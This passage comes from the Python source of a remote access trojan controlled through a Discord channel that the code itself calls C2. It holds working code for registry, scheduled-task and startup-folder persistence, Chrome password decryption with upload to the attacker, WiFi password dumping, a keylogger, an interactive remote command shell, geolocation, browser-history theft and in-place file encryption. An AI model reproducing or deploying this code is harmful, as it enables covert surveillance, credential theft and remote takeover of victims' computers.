                    if ctx.channel == created_channel and ctx.message.content == "!better_check":
                        script_path = os.path.abspath(sys.argv[0])
                        # Check the current persistence status
                        current_status = CheckBetterPersistence(script_path)
                        response = "**Persistence Status:**\n"
                        response += f"**Registry** Persistence: **{'Enabled' if current_status['registry_persistence'] else 'Not Enabled'}** (Keyname is **{registryName}** and Actual filename is **{publicFileName}.pyw**)\n"
                        response += f"**Task Scheduler** Persistence: **{'Enabled' if current_status['task_scheduler_persistence'] else 'Not Enabled'}** (Taskname is **{taskName}** and Actual filename is **{publicFileName}.pyw**)\n"
                        response += f"**Startup** Persistence: **{'Enabled' if current_status['startup_persistence'] else 'Not Enabled'}** (Startup filename is **{startupName}.bat** and Actual filename is **{publicFileName}.pyw**)\n\n"

                        await ctx.send(response)

                def CheckBetterPersistence(script_path):
                    registry_persistence_exists = check_registry_persistence(script_path)
                    task_scheduler_persistence_exists = check_task_scheduler_persistence(script_path)
                    startup_persistence_exists = check_startup_persistence(script_path)

                    return {
                        "registry_persistence": registry_persistence_exists,
                        "task_scheduler_persistence": task_scheduler_persistence_exists,
                        "startup_persistence": startup_persistence_exists,
                    }

                def check_registry_persistence(script_path):
                    # Add your code to check registry persistence here
                    key = r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
                    public_directory = Path('C:/Users/Public')
                    copied_script_path = public_directory / (publicFileName + ".pyw")

                    try:
                        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_READ) as registry_key:
                            value, _ = winreg.QueryValueEx(registry_key, registryName)
                            return value == str(copied_script_path)
                    except Exception:
                        return False

                def check_task_scheduler_persistence(script_path):
                    # Add your code to check task scheduler persistence here
                    result = os.system(f'schtasks /query /tn {taskName}')
                    return result == 0  # Task exists

                def check_startup_persistence(script_path):
                    # Add your code to check startup folder persistence here
                    public_directory = Path('C:/Users/Public')
                    copied_script_path = public_directory / (publicFileName + ".pyw")
                    startup_folder = Path(os.path.expanduser("~")) / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
                    shortcut_path = startup_folder / f'{startupName}.bat'

                    return os.path.exists(str(shortcut_path))


                # Uninstall
                @bot.command()
                async def better_uninstall(ctx):
                    if ctx.channel == created_channel and ctx.message.content == "!better_uninstall":
                        script_path = os.path.abspath(sys.argv[0])

                        try:
                            # Check the current persistence status
                            current_status = CheckBetterPersistence(script_path)

                            # Check if the cloned script is in the public directory
                            public_directory = Path('C:/Users/Public')
                            copied_script_path = public_directory / (publicFileName + ".pyw")
                            if (Path(script_path) != copied_script_path):
                                await ctx.send("Hmm, Duplicated Script is not in the public directory.")    
                            else:
                                await ctx.send(f"Duplicated Script is in the public directory as expected, removing it...")
                                # Remove the script from the public directory
                                os.remove(copied_script_path)
                                await ctx.send(f"Duplicated Script removed from public directory! Continuing...")

                            if current_status['registry_persistence']:
                                try:
                                    await ctx.send("Disabling Registry Persistence...")
                                    remove_registry_persistence()
                                    await ctx.send("Registry Persistence disabled.")
                                except Exception as e:
                                    await ctx.send(f"Error disabling registry persistence: {e}")

                            if current_status['task_scheduler_persistence']:
                                try:
                                    await ctx.send("Removing Task Scheduler Persistence...")
                                    remove_task_scheduler_persistence()
                                    await ctx.send("Task Scheduler Persistence removed.")
                                except Exception as e:
                                    await ctx.send(f"Error removing task scheduler persistence: {e}")

                            if current_status['startup_persistence']:
                                try:
                                    await ctx.send("Disabling Startup Persistence...")
                                    remove_startup_persistence()
                                    await ctx.send("Startup Persistence disabled.")
                                except Exception as e:
                                    await ctx.send(f"Error disabling startup persistence: {e}")

                            await ctx.send("\n**Done with uninstalling persistence!**\n")

                        except Exception as e:
                            await ctx.send(f"An error occurred: {e}")

                # Add functions to remove persistence
                def remove_registry_persistence():
                    key = r'Software\Microsoft\Windows\CurrentVersion\Run'

                    try:
                        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_WRITE) as registry_key:
                            winreg.DeleteValue(registry_key, registryName)
                    except Exception as e:
                        print(f"Error removing registry persistence: {e}")

                def remove_task_scheduler_persistence():
                    os.system(f"schtasks /delete /tn {taskName} /f")

                def remove_startup_persistence():
                    startup_folder = Path(os.path.expanduser("~")) / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
                    shortcut_path = startup_folder / f'{startupName}.bat'

                    if os.path.exists(str(shortcut_path)):
                        os.remove(str(shortcut_path))



                USER_DATA_PATH, LOCAL_STATE_PATH = f"{os.environ['USERPROFILE']}\\AppData\\Local\\Google\\Chrome\\User Data", f"{os.environ['USERPROFILE']}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
                TEMP_DB = f"{os.environ['TEMP']}\\justforfun.db"

                @bot.command()
                async def passwords_chrome(ctx):
                    if ctx.channel == created_channel and ctx.message.content == "!passwords_chrome":
                        await ctx.send("Grabbing passwords...")
                        print("Chrome Password Decryptor by bytemafia")
                        file_location = os.path.join(os.getcwd(), "passwords.csv") # Full file path
                        with open(file_location, mode='w', newline='') as passfile: # Write file
                            writer = csv.writer(passfile, delimiter=',')
                            writer.writerow(["No      <->      URL      <->      Username      <->      Password"])
                            secret_key = secretKey()
                            default_folders = ("Profile", "Default")
                            data_folders = [data_path for data_path in os.listdir(USER_DATA_PATH) if data_path.startswith(default_folders)]
                            for data_folder in data_folders:
                                db_path = f"{USER_DATA_PATH}\\{data_folder}\\Login Data" # Chrome db
                                con = login_db(db_path)
                            if secret_key and con:
                                cur = con.cursor()
                                cur.execute("select action_url, username_value, password_value from logins")
                                for index, data in enumerate(cur.fetchall()):
                                    url = data[0]
                                    username = data[1]
                                    ciphertext = data[2]
                                    if url != "" and username != "" and ciphertext != "": # To only collect valid entries
                                        password = password_decrypt(secret_key, ciphertext)
                                        writer.writerow([index, url, username, password])
                                print("Completed! File is at: " + file_location)
                                con.close()
                                os.remove(TEMP_DB)

                        # Uploading the file to the Discord server channel
                        with open(file_location, 'rb') as file:
                            file = discord.File(file)
                            await ctx.send("Here are the Chrome passwords:", file=file)

                        # Remove the file after uploading
                        os.remove(file_location)

                # Collecting secret key
                def secretKey():
                    try:
                        with open(LOCAL_STATE_PATH, "r") as f:
                            local_state = f.read()
                            key_text = json.loads(local_state)["os_crypt"]["encrypted_key"]
                        key_buffer = base64.b64decode(key_text)[5:]
                        key = win32crypt.CryptUnprotectData(key_buffer)[1]
                        return key
                    except Exception as e:
                        print(e)

                # Login to db where creds are stored
                def login_db(db_path):
                    try:
                        shutil.copy(db_path, TEMP_DB) # Copy to temp dir, otherwise get permission error
                        sql_connection = sqlite3.connect(TEMP_DB)
                        return sql_connection
                    except Exception as e:
                        print(e)

                # Decrypt the password
                def password_decrypt(secret_key, ciphertext):
                    try:
                        iv = ciphertext[3:15]
                        password_hash = ciphertext[15:-16]
                        cipher = AES.new(secret_key, AES.MODE_GCM, iv)
                        password = cipher.decrypt(password_hash).decode()
                        return password
                    except Exception as e:
                        print(e)

                @bot.command()
                async def interactive_cmd(ctx):
                    if ctx.channel == created_channel and ctx.message.content == "!interactive_cmd":
                        # Check if the command was sent in a text channel and matches the command trigger
                        initial_directory = "C:/Users"  # Replace with your actual directory path
                        await ctx.send(f"Interactive command prompt started in {initial_directory}. Type `exit` to exit.")

                        # Start a subprocess for the command prompt
                        process = subprocess.Popen(
                            ['cmd'],
                            stdin=subprocess.PIPE,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            shell=True,
                            cwd=initial_directory  # Set the initial directory
                        )

                        # Read and discard the initial copyright message
                        while True:
                            output_line = process.stdout.readline().decode('latin-1').strip()
                            if not output_line or output_line.endswith(initial_directory + ">"):
                                break

                        async def read_output():
                            while True:
                                output_line = process.stdout.readline().decode('latin-1').strip()
                                if not output_line or output_line.endswith(initial_directory + ">"):
                                    break
                                await ctx.send(f"```\n{output_line}\n```")

                        try:
                            while True:
                                user_input = await bot.wait_for('message', check=lambda message: message.channel == created_channel)
                                if user_input.content.lower() == 'exit':
                                    await ctx.send("Interactive command prompt ended.")
                                    break

                                # Send user's input to the command prompt
                                process.stdin.write(f"{user_input.content}\n".encode())
                                process.stdin.flush()

                                # Read the output of the previous command
                                await read_output()

                        except Exception as e:
                            await ctx.send(f"An error occurred: {e}")

                        process.terminate()

                @bot.command()
                async def geolocate(ctx):
                    if ctx.channel == created_channel and ctx.message.content == "!geolocate":
                        await ctx.send("Calculating position...")
                        gmaps = googlemaps.Client(GOOGLE_API_KEY)
                        loc = gmaps.geolocate()
                        latitude = loc['location']['lat']
                        longitude = loc['location']['lng']
                        accuracy_radius = loc['accuracy']  # Get the accuracy radius

                        google_maps_link = f"https://maps.google.com/maps?q={latitude},{longitude}"
                        await ctx.send(f"Google Maps Link: {google_maps_link}")
                        await ctx.send(f"Accuracy Radius: {accuracy_radius} meters")

                @bot.command()
                async def messagebox(ctx, type, title, message):
                    if ctx.channel == created_channel:
                        try:
                            if not type or not title or not message:
                                await ctx.send("Please make sure you use the following syntax:\n!messagebox [type] [title] [message]")
                            else:
                                if type == "error":
                                    await ctx.send("Messagebox sent **sucessfully**")
                                    mb.showerror(title, message)

                                elif type == "info":
                                    await ctx.send("Messagebox sent **sucessfully**")
                                    mb.showinfo(title, message)

                                elif type == "warning":
                                    await ctx.send("Messagebox sent **sucessfully**")
                                    mb.showwarning(title, message)

                        except Exception as e:
                            await ctx.send(f"An error ocurred when showing messagebox:\n{e}")

                # Network stealer
                @bot.command()
                async def network(ctx):
                    if ctx.channel == created_channel and ctx.message.content == "!network":
                        await ctx.send("Loading WiFi SSIDs and passwords...")
                        nameListString = ""
                        networkNames = subprocess.check_output("netsh wlan show profile", shell=True, text=True)
                        networkNamesLines = networkNames.splitlines()
                        for line in networkNamesLines:
                            line.strip()
                            if ':' in line:
                                start = line.index(':') +1
                                name = str(line[start:].strip())
                                if len(name) > 1:
                                    try:
                                        checkInfo = f"netsh wlan show profile name=\"{name}\" key=clear"
                                        nameInfo = subprocess.check_output(checkInfo, shell=True, text=True)
                                        nameInfo = nameInfo.splitlines()
                                    except subprocess.CalledProcessError:
                                        continue
                                    password = "[!] Not Found!"
                                    for i in nameInfo:
                                        if "Key Content" in i:
                                            start = i.index(":") +1
                                            password = i[start:].strip()
                                    nameListString += "\t\t" + name + "\t:\t" + password + "\n"
                        await ctx.send(f"**Saved Networks [NAME : PASSWORD]**:\n\n {nameListString}")

                def secure_delete_file(path_to_file):
                    # Securely delete a file by setting its data to zero.
                    CallME('fsutil.exe file setZeroData offset=0 length=9999999999 "' + path_to_file + '"')
                    os.remove(path_to_file)

                @bot.command()
                async def securefile(ctx, path):
                    if ctx.channel == created_channel:
                        if not path:
                            await ctx.send("Please provide path to file (!securefile <path-to-file>).")
                            return
                        try:
                            secure_delete_file(path)
                            await ctx.send("Successfully fucked file!")
                            await ctx.message.add_reaction("\U0001F4A5")  # boom emoji
                        except FileNotFoundError as fnfe:
                            await ctx.send("The specified file was not found (" + str(fnfe) + ")")
                            return

                @bot.command()
                async def sendkey(ctx, Key):
                    if ctx.channel == created_channel:
                        if not Key:
                            await ctx.send("Please provide keys to be pressed (!SendKey <Hello-World\{ENTER\}>).")
                            return

                        await ctx.send("Creating .VBS script")

                        # Change all "-" to " "
                        Key = Key.replace("-", " ")

                        # Create new .vbs script to send key
                        script_path = r'C:\users\public\key.vbs'
                        with open(script_path, 'w') as f:
                            f.write('Set WshShell = WScript.CreateObject("WScript.Shell")\n')
                            f.write(f'WshShell.SendKeys "{Key}"\n')

                        # Execute .vbs script
                        await ctx.send("Executing Script!")
                        CallME(f'cscript "{script_path}"')

                        await ctx.send("Sent key: " + Key)
                        await ctx.send("Removing Script...")
                        os.remove(script_path)
                        await ctx.send("Script removed!")


                # Create a variable to store the logged keys
                logged_keys = []

                # Define a global variable for the listener and is_logging
                listener = None
                is_logging = False

                # Define keys that should trigger a new line
                new_line_keys = set([keyboard.Key.shift_r, keyboard.Key.backspace])

                def on_key_press(key):
                    global is_logging
                    if is_logging:
                        try:
                            # Check if the key is a modifier key and skip logging if it is
                            if isinstance(key, keyboard.KeyCode):
                                logged_key = key.char
                            else:
                                logged_key = f"[{str(key)}]"

                            if key in new_line_keys:
                                logged_keys.append("\n")  # Start a new line
                            logged_keys.append(f"Key: {logged_key} ")
                        except AttributeError:
                            if key == keyboard.Key.space:
                                logged_key = " "
                            else:
                                logged_key = f"[{str(key)}]"

                            if key in new_line_keys:
                                logged_keys.append("\n")  # Start a new line
                            logged_keys.append(f"Key: {logged_key} ")

                def start_logging():
                    global listener, is_logging
                    logged_keys.clear()  # Clear previously logged keys
                    listener = keyboard.Listener(on_press=on_key_press)
                    listener.start()
                    is_logging = True
                    print("Logging started...")

                def stop_logging():
                    global listener, is_logging
                    if listener:
                        listener.stop()
                        with open("keylog.txt", "w") as logfile:
                            logfile.write(" ".join(logged_keys))
                        is_logging = False
                        print("Logging stopped. Keys saved to 'keylog.txt'")

                @bot.command()
                async def startlog(ctx):
                    if ctx.channel == created_channel:
                        global is_logging
                        if is_logging:
                            await ctx.send("Logging is already started. Use **!dumplog** to see logs.")
                        else:
                            start_logging()
                            await ctx.send("Logging started. Use **!dumplog** to see logs.")

                @bot.command()
                async def stoplog(ctx):
                    if ctx.channel == created_channel:
                        global is_logging
                        if is_logging:
                            stop_logging()
                            await ctx.send("Logging stopped. Use **!dumplog** to see logs.")
                        else:
                            await ctx.send("Logging is already stopped. Use **!dumplog** to see logs.")

                @bot.command()
                async def dumplog(ctx):
                    if ctx.channel == created_channel:
                        global logged_keys
                        if logged_keys:
                            # Save the logged keys to a text file
                            with open("keylog.txt", "w") as logfile:
                                logfile.write("".join(logged_keys))

                            # Send the log file as an attachment
                            await ctx.send("Here is the log:", file=discord.File("keylog.txt"))

                            # Delete the temporary log file
                            os.remove("keylog.txt")
                        else:
                            await ctx.send("No keys have been logged yet.")

                @bot.command()
                async def restart(ctx):
                    global created_channel
                    if ctx.channel == created_channel:

                        await ctx.send("Restarting...")

                        # Determine the script filename dynamically
                        script_filename = sys.argv[0]

                        # Build the command to run the script with arguments
                        script_command = [sys.executable, script_filename]

                        # Start a new process to run the script
                        subprocess.Popen(script_command)

                        # Delete channel
                        if created_channel:
                            await created_channel.delete()

                        # Exit the current script
                        sys.exit()


                def installNirsoft(zip_file_url, exe_file_name):
                    # Destination path for the downloaded .zip file
                    zip_download_path = r"C:\\Users\\Public\\archive.zip"

                    # Directory where you want to extract the .exe file
                    extraction_directory = r"C:\\Users\\Public"

                    # Check if the .zip file already exists, and if not, download it
                    if not os.path.exists(zip_download_path):
                        try:
                            # Download the .zip file
                            response = requests.get(zip_file_url)
                            with open(zip_download_path, 'wb') as file:
                                file.write(response.content)
                            print(f".zip File downloaded to {zip_download_path}")
                        except Exception as e:
                            print(f".zip File download failed: {str(e)}")

                    # Extract the .exe file from the .zip archive
                    try:
                        with zipfile.ZipFile(zip_download_path, 'r') as zip_ref:
                            # Check if the .exe file exists in the archive
                            if exe_file_name in zip_ref.namelist():
                                zip_ref.extract(exe_file_name, extraction_directory)
                                exe_path = os.path.join(extraction_directory, exe_file_name)
                                print(f".exe File extracted to {exe_path}")
                            else:
                                print(f".exe file '{exe_file_name}' not found in the archive.")
                    except Exception as e:
                        print(f"Extraction of .exe file failed: {str(e)}")

                def program_isInstalled(full_path_to_exe):
                    return os.path.exists(full_path_to_exe)


                @bot.command()
                async def history(ctx):
                    if ctx.channel == created_channel:
                        # URL of the .zip file to download
                        zip_file_url = "https://www.nirsoft.net/utils/browsinghistoryview.zip"

                        # Destination path for the downloaded .zip file
                        zip_download_path = r"C:\\Users\\Public\\archive.zip"

                        # Directory where you want to extract the .exe file
                        extraction_directory = r"C:\\Users\\Public"

                        # Command to execute after extracting the .exe file
                        command_to_execute = r'C:\Users\Public\BrowsingHistoryView.exe /HistorySource 1 /LoadChrome 1 /shtml "C:\Users\Public\history.html"'

                        # Delete the files that were created by the previous command
                        # Check if any of the files (.html, .zip, .exe) exists
                        if (os.path.exists(extraction_directory + "\\history.html") or os.path.exists(zip_download_path) or os.path.exists(extraction_directory + "\\BrowsingHistoryView.exe")):
                            # Delete the files
                            # Check if history.html exists
                            if os.path.exists(extraction_directory + "\\history.html"):
                                os.remove(extraction_directory + "\\history.html")
                            # Check if the .zip file exists
                            if os.path.exists(zip_download_path):
                                os.remove(zip_download_path)
                            # Check if the .exe file exists
                            if os.path.exists(extraction_directory + "\\BrowsingHistoryView.exe"):
                                os.remove(extraction_directory + "\\BrowsingHistoryView.exe")
                            print(".zip, .html, and .exe files deleted from last execution.")
                            await ctx.send(f".zip, .html, and .exe files deleted from last execution.")
                        else:
                            print("No files to delete from last command.")
                            await ctx.send("No files to delete from last command.")

                        # Check if the .zip file already exists, and if not, download it
                        if not os.path.exists(zip_download_path):
                            try:
                                # Download the .zip file
                                response = requests.get(zip_file_url)
                                with open(zip_download_path, 'wb') as file:
                                    file.write(response.content)
                                await ctx.send(f".zip File downloaded to {zip_download_path}")
                                print(f".zip File downloaded to {zip_download_path}")
                            except Exception as e:
                                await ctx.send(f".zip File download failed: {str(e)}")
                                print(f".zip File download failed: {str(e)}")

                        # Extract the .exe file from the .zip archive
                        try:
                            with zipfile.ZipFile(zip_download_path, 'r') as zip_ref:
                                # Specify the name of the .exe file you want to extract
                                exe_file_name = "BrowsingHistoryView.exe"

                                # Check if the .exe file exists in the archive
                                if exe_file_name in zip_ref.namelist():
                                    zip_ref.extract(exe_file_name, extraction_directory)
                                    exe_path = os.path.join(extraction_directory, exe_file_name)
                                    await ctx.send(f".exe File extracted to {exe_path}")
                                    print(f".exe File extracted to {exe_path}")
                                else:
                                    await ctx.send(f".exe file '{exe_file_name}' not found in the archive.")
                                    print(f".exe file '{exe_file_name}' not found in the archive.")
                        except Exception as e:
                            await ctx.send(f"Extraction of .exe file failed: {str(e)}")
                            print(f"Extraction of .exe file failed: {str(e)}")

                        # Execute the command using the extracted .exe file
                        try:
                            subprocess.run(command_to_execute, shell=True, cwd=extraction_directory)
                            success_message = "Command executed successfully."
                            print(success_message)
                            await ctx.send(success_message)

                            # Send file to C2
                            await ctx.send("Sent file to C2", file=discord.File(extraction_directory + "\\history.html"))

                            # Delete the archive (.zip) and the extracted .exe file
                            os.remove(extraction_directory + "\\history.html")
                            os.remove(zip_download_path)
                            os.remove(extraction_directory + "\\BrowsingHistoryView.exe")
                            print(".zip, .html, and .exe files deleted.")
                            await ctx.send(".zip, .html, and .exe files deleted.")
                        except Exception as e:
                            error_message = f"Command execution failed: {str(e)}"
                            print(error_message)
                            await ctx.send("Error: " + error_message)

                @bot.command()
                async def volume(ctx, volume_amount):
                    if ctx.channel == created_channel:
                        try:
                            volume_amount = int(volume_amount)  # Convert the input to an integer

                            if program_isInstalled("C:\\Users\\Public\\nircmd.exe"):
                                await ctx.send(f"NirCMD is installed and ready!")

                                if (0 <= volume_amount <= 100):
                                    # Calculate from percentage to NirCMD volume (1% being 655)
                                    volume_level = volume_amount * 655

                                    try:
                                        command = f"C:\\Users\\Public\\nircmd.exe setsysvolume {volume_level}"  # Update the path here
                                        os.system(command)
                                        await ctx.send(f"Volume changed to {volume_amount}%.")
                                        await ctx.send(f"Removing NirCMD...")
                                        if (os.path.exists("C:\\Users\\Public\\nircmd.exe")):
                                            os.remove("C:\\Users\\Public\\nircmd.exe")
                                        if (os.path.exists("C:\\users\\public\\archive.zip")):
                                            os.remove("C:\\users\\public\\archive.zip")
                                        await ctx.send(f"NirCMD removed!")
                                    except Exception as e:
                                        await ctx.send(f"An error occurred while changing the volume: {e}")
                                else:
                                    await ctx.send("Volume amount must be between 0 and 100.")
                            else:
                                await ctx.send("NirCMD is not installed, installing it now!")

                                # Install NirCMD om man inte har det
                                installNirsoft("https://www.nirsoft.net/utils/nircmd.zip", "nircmd.exe")

                                await ctx.send("NirCMD has been installed.")
                                if (0 <= volume_amount <= 100):
                                    # Calculate from procentage to NirCMD volume (1% being 655)
                                    volume_level = volume_amount * 655

                                    try:
                                        command = f"C:\\Users\\Public\\nircmd.exe setsysvolume {volume_level}"  # Update the path here
                                        os.system(command)
                                        await ctx.send(f"Volume changed to {volume_amount}%.")
                                        await ctx.send(f"Removing NirCMD...")
                                        if (os.path.exists("C:\\Users\\Public\\nircmd.exe")):
                                            os.remove("C:\\Users\\Public\\nircmd.exe")
                                        if (os.path.exists("C:\\users\\public\\archive.zip")):
                                            os.remove("C:\\users\\public\\archive.zip")
                                        await ctx.send(f"NirCMD removed!")
                                    except Exception as e:
                                        await ctx.send(f"An error occurred while changing the volume: {e}")
                                else:
                                    await ctx.send("Volume amount must be between 0 and 100.")
                        except ValueError:
                            await ctx.send("Invalid volume amount. Please provide a number between 0 and 100.")
                        except Exception as e:
                            await ctx.send(f"An error occurred: {e}")

                @bot.command()
                async def install(ctx):
                    if ctx.channel == created_channel and ctx.message.content == '!install':
                        print("Received !install command")
                        await ctx.send("Installing the bot on startup...")

                        try:
                            # Check if the operating system is Windows
                            if platform.system() == "Windows":
                                print("Operating system is Windows")
                                await ctx.send("Client is using Windows...")

                                script_path = os.path.abspath(__file__)
                                startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")

                                try:
                                    if running_as_executable:
                                        await ctx.send("Client has the **.exe** extension on payload.")
                                        # If the script is an executable
                                        executable_path = sys.executable
                                        executable_link_path = os.path.join(startup_folder, "DiscordBOT.exe")
                                        shutil.copy2(executable_path, executable_link_path)
                                        print(f"Executable copied to: {executable_link_path}")
                                    else:
                                        # If the script is a .py file
                                        if script_path.endswith('.py'):
                                            await ctx.send("Client has the **.py** extension on payload.")
                                            # Create a duplicate copy of the script in C:\Users\Public\PythonScripts
                                            public_folder = os.path.join(os.environ["PUBLIC"], "PythonScripts")
                                            os.makedirs(public_folder, exist_ok=True)
                                            await ctx.send("Created PythonScripts directory at **" + public_folder + "**")
                                            duplicate_script_path = os.path.join(public_folder, "DiscordBOT_duplicate.py")
                                            shutil.copy2(script_path, duplicate_script_path)
                                            await ctx.send("Copied .py file from **" + script_path + "** to **" + duplicate_script_path + "**")

                                            # Create a batch script to run the duplicate .py script
                                            batch_script_path = os.path.join(startup_folder, "DiscordBOT.bat")
                                            batch_script_content = f'@echo off\n"{sys.executable}" "{duplicate_script_path}"'
                                            with open(batch_script_path, 'w') as batch_file:
                                                batch_file.write(batch_script_content)
                                            print(f"Batch script created at: {batch_script_path}")
                                            await ctx.send(f"Batch script created at: **{batch_script_path}**")
                                        elif script_path.endswith('.pyw'):
                                            await ctx.send("Client has the **.pyw** extension on payload.")
                                            # Create a duplicate copy of the script in C:\Users\Public\PythonScripts
                                            public_folder = os.path.join(os.environ["PUBLIC"], "PythonScripts")
                                            os.makedirs(public_folder, exist_ok=True)
                                            await ctx.send("Created PythonScripts directory at **" + public_folder + "**")
                                            duplicate_script_path = os.path.join(public_folder, "DiscordBOT_duplicate.pyw")
                                            shutil.copy2(script_path, duplicate_script_path)
                                            await ctx.send("Copied .pyw file from **" + script_path + "** to **" + duplicate_script_path + "**")

                                            # Create a batch script to run the duplicate .py script
                                            batch_script_path = os.path.join(startup_folder, "DiscordBOT.bat")
                                            batch_script_content = f'@echo off\n"{sys.executable}" "{duplicate_script_path}"'
                                            with open(batch_script_path, 'w') as batch_file:
                                                batch_file.write(batch_script_content)
                                            print(f"Batch script created at: {batch_script_path}")
                                            await ctx.send(f"Batch script created at: **{batch_script_path}**")
                                        else:
                                            await ctx.send("Client has the **.exe** extension on payload.")
                                            # If the script is an .exe file
                                            exe_link_path = os.path.join(startup_folder, "DiscordBOT.exe")
                                            shutil.copy2(script_path, exe_link_path)
                                            print(f"Executable copied to: **{exe_link_path}**")

                                    await ctx.send("Bot installed on startup!")
                                    print("Bot installed on startup!")
                                except Exception as copy_error:
                                    await ctx.send(f"An error occurred while copying the script: {copy_error}")
                                    print(f"An error occurred while copying the script: {copy_error}")
                            else:
                                await ctx.send("This feature is only supported on Windows.")
                                print("This feature is only supported on Windows.")
                        except Exception as os_error:
                            await ctx.send(f"An error occurred while checking the operating system: {os_error}")
                            print(f"An error occurred while checking the operating system: {os_error}")

                @bot.command()
                async def uninstall(ctx):
                    if ctx.channel == created_channel and ctx.message.content == '!uninstall':
                        print("Received !uninstall command")
                        await ctx.send("Uninstalling the bot...")

                        try:
                            # Check if the operating system is Windows
                            if platform.system() == "Windows":
                                print("Operating system is Windows")
                                await ctx.send("Client is using Windows")

                                startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
                                batch_script_path = os.path.join(startup_folder, "DiscordBOT.bat")
                                exe_link_path = os.path.join(startup_folder, "DiscordBOT.exe")

                                # Remove the batch script and executable link
                                if os.path.exists(batch_script_path):
                                    secure_delete_file(batch_script_path)
                                    print(f"Batch script removed: {batch_script_path}")
                                    await ctx.send(f"Batch script removed: **{batch_script_path}**")
                                if os.path.exists(exe_link_path):
                                    secure_delete_file(exe_link_path)
                                    print(f"Executable link removed: {exe_link_path}")
                                    await ctx.send(f"Executable link removed: **{exe_link_path}**")

                                # Display a message indicating that persistence has been removed
                                await ctx.send("Bot persistence removed!")
                                print("Bot persistence removed!")
                            else:
                                await ctx.send("This feature is only supported on Windows.")
                                print("This feature is only supported on Windows.")
                        except Exception as e:
                            await ctx.send(f"An error occurred while uninstalling: {e}")
                            print(f"An error occurred while uninstalling: {e}")

                @bot.command()
                async def elevate(ctx):
                    if ctx.channel == created_channel:
                        if is_admin():
                            await ctx.send("User has administrative privileges.")
                        else:
                            return await ctx.send(elevate_privileges())

                @bot.command()
                async def cat(ctx, file_name):
                    if ctx.channel == created_channel:
                        try:
                            with open(file_name, 'r') as file:
                                file_content = file.read()
                                await ctx.send(f"Content of '{file_name}':\n```\n{file_content}\n```")
                        except Exception as e:
                            await ctx.send(f"An error occurred while reading the file: {e}")

                @bot.command()
                async def upload(ctx):
                    if ctx.channel == created_channel and ctx.message.attachments:
                        attachment = ctx.message.attachments[0]
                        await attachment.save(attachment.filename)
                        await ctx.send(f"File '{attachment.filename}' uploaded successfully.")
                    elif not ctx.messege.attachments:
                        await ctx.send(f"File did not upload, you did not attach any files...")

                # Function to generate a Fernet key from a password
                def generate_key_from_password(password, salt=None):
                    if salt is None:
                        salt = os.urandom(16)
                    kdf = PBKDF2HMAC(
                        algorithm=hashes.SHA256(),
                        iterations=100000,  # You can adjust the number of iterations as needed
                        salt=salt,
                        length=32  # Length of the derived key
                    )
                    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
                    return key, salt

                # Function to encrypt a file
                def encrypt_file(input_file, password):
                    try:
                        key, salt = generate_key_from_password(password)
                        fernet = Fernet(key)

                        with open(input_file, 'rb') as file:
                            file_data = file.read()

                        encrypted_data = fernet.encrypt(file_data)

                        # Use the same filename for the encrypted file
                        with open(input_file, 'wb') as encrypted_file:
                            encrypted_file.write(salt + encrypted_data)

                        return input_file  # Return the updated input file name
                    except InvalidToken:
                        return "Invalid token (key or password)"

                # Function to decrypt a file
                def decrypt_file(input_file, password):
                    try:
                        with open(input_file, 'rb') as encrypted_file:
                            salt = encrypted_file.read(16)  # Read the salt
                            encrypted_data = encrypted_file.read()

                        key, _ = generate_key_from_password(password, salt)  # Reconstruct the key

                        fernet = Fernet(key)
                        decrypted_data = fernet.decrypt(encrypted_data)

                        # Use the same filename for the decrypted file
                        with open(input_file, 'wb') as decrypted_file:
                            decrypted_file.write(decrypted_data)

                        return input_file  # Return the updated input file name
                    except InvalidToken:
                        return "Invalid token (key or password)"

                @bot.command()
                async def encrypt(ctx, input_file, password):
                    if ctx.channel == created_channel:
                        encrypted_file_name = encrypt_file(input_file, password)
                        await ctx.send(f'File encrypted and saved as {encrypted_file_name}')
                        return encrypted_file_name

                @bot.command()
                async def decrypt(ctx, input_file, password):
                    if ctx.channel == created_channel:
                        decrypted_file_name = decrypt_file(input_file, password)
                        if decrypted_file_name != "Invalid token (key or password)":
                            await ctx.send(f'File decrypted and saved as {decrypted_file_name}')
                        else:
                            await ctx.send(decrypted_file_name)

                def has_persistence():
                    # Check if the bot has persistence using either the .py or .exe method
                    script_path = os.path.abspath(__file__)
                    startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
                    batch_script_path = os.path.join(startup_folder, "DiscordBOT.bat")
                    exe_link_path = os.path.join(startup_folder, "DiscordBOT.exe")

                    return os.path.exists(batch_script_path) or os.path.exists(exe_link_path) or script_path.endswith('.exe')

                def has_better_persistence():
                    if (Path.exists(f"C:\\users\\public\\{publicFileName}.pyw")):
                        print("Noted: Client has the .pyw file in Public directory.")
                        # Check if the client has persistence using all methods (registry, task scheduler, startup folder) 
                        persistence_results = CheckBetterPersistence(script_path)

                        # Check if all persistence mechanisms are detected
                        return all(persistence_results.values())
                    else:
                        print("Client does not have persistence. (Specifically, does not have the .pyw file in Public directory)")
                        return False

                def get_system_info():
                    try:
                        script_path = os.path.abspath(sys.argv[0])
                        info = []
                        info.append(f"System: {platform.system()}")
                        info.append(f"Node Name: {platform.node()}")
                        info.append(f"Release: {platform.release()}")
                        info.append(f"Version: {platform.version()}")
                        info.append(f"Machine: {platform.machine()}")
                        info.append(f"Processor: {platform.processor()}")

                        # Memory information
                        memory = psutil.virtual_memory()
                        info.append(f"Memory Total: {convert_bytes(memory.total)}")
                        info.append(f"Memory Available: {convert_bytes(memory.available)}")
                        info.append(f"Memory Used: {convert_bytes(memory.used)} ({memory.percent}%)")

                        # Disk information
                        partitions = psutil.disk_partitions()
                        for partition in partitions:
                            partition_usage = psutil.disk_usage(partition.mountpoint)
                            info.append(f"Disk {partition.device} ({partition.mountpoint}):")
